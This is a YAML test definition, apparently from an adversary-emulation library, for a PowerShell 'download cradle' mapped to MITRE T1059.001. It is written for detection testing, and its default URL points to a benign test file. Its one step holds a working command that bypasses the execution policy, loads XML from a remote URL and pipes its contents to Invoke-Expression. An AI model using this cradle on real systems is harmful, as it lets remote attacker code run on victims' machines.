api_version: "2.0"
name: Powershell XML requests
description: |
    Powershell xml download request. Upon execution, "Download Cradle test success!" will be dispalyed.

    Provided by https://github.com/mgreen27/mgreen27.github.io
args:
    - name: url
      type: url
      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml
uuid: 4396927f-e503-427b-b023-31049b9b09a6
mitre:
    tactics:
        - 'TA0002: Execution'
    techniques:
        - 'T1059: Command and Scripting Interpreter'
    subtechniques:
        - 'T1059.001: PowerShell'
requirements:
    platforms:
        - os: windows
steps:
    - name: powershell-xml-requests
      inline: |
        "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('{{.Args.url}}');$Xml.command.a.execute | IEX"
      executor: command_prompt
      cleanup:
        inline: ""
        executor: command_prompt
